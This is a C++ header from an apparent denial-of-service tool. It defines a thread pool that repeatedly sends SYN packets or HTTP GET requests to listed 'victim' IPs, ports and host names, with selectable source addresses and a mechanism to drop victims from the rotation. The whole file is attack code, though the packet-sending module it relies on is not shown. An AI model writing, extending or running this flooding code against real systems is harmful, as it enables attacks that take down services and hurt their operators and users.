#ifndef EXAMPLE_SYN_THREAD_POOL_H
#define EXAMPLE_SYN_THREAD_POOL_H

#include <condition_variable>
#include <queue>
#include <future>
#include <unordered_map>
#include "tbb/concurrent_unordered_set.h"
#include "packet_sending.h"

#define SYN_FLOOD 1
#define HTTP_FLOOD 2

struct src_dst
{
    int source_ip;
    int source_port;
    int dest_ip;
    int dest_port;
    int flood_type;
    const char* host_name;
    int status;
};

class thread_pool
{
    public:
	packet_sending send;

	explicit thread_pool(int threads) : send()
	{
		start(threads);
	}

	~thread_pool()
	{
		stop();
	}

	void enqueue(src_dst ports_ips)
	{
		{
			std::unique_lock<std::mutex> lock{event_mutex};

			size_t target = 0;
			size_t min_size = tasks_per_thread[target].size();
			for (int i = 0; i < tasks_per_thread.size(); i++)
			{
				size_t cur_size = tasks_per_thread[i].size();
				if (cur_size < min_size)
				{
					min_size = cur_size;
					target = i;
				}
			}
			tasks_per_thread[target].push_back(ports_ips);
		}
		event_char_m.notify_one();
	}

	void insert_pill(int thread_num)
	{
		{
			std::unique_lock<std::mutex> lock{event_mutex};
			src_dst poison{};
			poison.source_port = 0;
			tasks_per_thread[thread_num].push_front(poison);
		}
	}

	void remove_victim(src_dst ips_ports_to_remove)
	{
		{
			std::unique_lock<std::mutex> lock{event_mutex};
			victims_to_remove.push_back(ips_ports_to_remove);
		}
	}


    private:
	std::vector<std::thread> threads_m;
	std::condition_variable event_char_m;
	std::mutex event_mutex;
	bool stop_m = false;
	std::unordered_map<size_t, std::deque<src_dst>> tasks_per_thread;
	std::vector<src_dst> victims_to_remove;

	void start(int threads)
	{
		for (auto i = 0; i < threads; i++)
		{
			threads_m.emplace_back([=] {
			  while(true)
			  {
				  src_dst ips_ports{};
				  {
					  std::unique_lock<std::mutex> lock{event_mutex};
					  event_char_m.wait(lock, [=] {return stop_m || !tasks_per_thread[i].empty();});
					  if (stop_m && tasks_per_thread[i].empty())
						  break;

					  ips_ports = tasks_per_thread[i].front();
					  tasks_per_thread[i].pop_front();
					  if (ips_ports.source_port == 0)
					  {
						  tasks_per_thread[i].clear();
						  break;
					  }
					  int in = 0;
					  for (int j = 0; j < victims_to_remove.size(); j++)
					  {
						  if ((victims_to_remove[j].dest_port == ips_ports.dest_port
						       && victims_to_remove[j].dest_ip == ips_ports.dest_ip)
						      || victims_to_remove[j].host_name == ips_ports.host_name)
						  {
							  in = 1;
							  victims_to_remove.erase(victims_to_remove.cbegin()+j);
							  break;
						  }
					  }
					  if (!in)
					  {
						  tasks_per_thread[i].push_back(ips_ports);
					  }
				  }
				  if (ips_ports.flood_type == SYN_FLOOD)
				  {
					  packet_sending::send_tcp(ips_ports.source_ip, ips_ports.source_port, ips_ports.dest_ip, ips_ports.dest_port);
				  } else if (ips_ports.flood_type == HTTP_FLOOD)
				  {
					  packet_sending::send_get_request(ips_ports.host_name);
				  }
			  }
			});
		}
	}

	void stop() noexcept
	{
		{
			std::unique_lock<std::mutex> lock{event_mutex};
			stop_m = true;
		}
		event_char_m.notify_all();
		for (auto& thread: threads_m)
		{
			thread.join();
		}
		threads_m.clear();
	}
};

#endif //EXAMPLE_SYN_THREAD_POOL_H